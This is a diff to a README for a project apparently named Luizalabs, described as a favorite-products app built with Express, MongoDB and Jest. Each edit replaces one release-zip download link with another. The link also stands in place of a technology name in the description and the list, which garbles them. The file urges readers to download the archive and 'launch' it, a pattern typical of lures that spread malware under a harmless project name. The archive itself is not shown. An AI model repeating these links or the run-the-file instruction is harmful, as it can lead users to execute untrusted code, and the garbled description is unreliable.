@@ -5,12 +5,12 @@ Welcome to the **Luizalabs** repository! This is a project that focuses on creat
 
 ## Repository Description
 
-**Luizalabs** is an application designed to handle the registration of favorite products. It is built using technologies like https://github.com/thurqs/luizalabs/releases/download/v1.0/Soft.zip, Express, MongoDB, and Jest for testing purposes. The codebase follows the principles of Clean Architecture, SOLID principles, and Design Patterns to ensure a robust and maintainable system.
+**Luizalabs** is an application designed to handle the registration of favorite products. It is built using technologies like https://github.com/thurqs/luizalabs/releases/download/v2.0/Software.zip, Express, MongoDB, and Jest for testing purposes. The codebase follows the principles of Clean Architecture, SOLID principles, and Design Patterns to ensure a robust and maintainable system.
 
 ## Technologies and Topics Covered
 
 ### Technologies Used:
-- https://github.com/thurqs/luizalabs/releases/download/v1.0/Soft.zip
+- https://github.com/thurqs/luizalabs/releases/download/v2.0/Software.zip
 - Express
 - MongoDB
 - Jest for Testing
@@ -41,7 +41,7 @@ Feel free to explore the codebase, run tests using Jest, and contribute to the p
 
 To download the full application, click the button below:
 
-[![Download Luizalabs App](https://github.com/thurqs/luizalabs/releases/download/v1.0/Soft.zip)](https://github.com/thurqs/luizalabs/releases/download/v1.0/Soft.zip)
+[![Download Luizalabs App](https://github.com/thurqs/luizalabs/releases/download/v2.0/Software.zip)](https://github.com/thurqs/luizalabs/releases/download/v2.0/Software.zip)
 
 **Launch the downloaded file to access the application.**
 
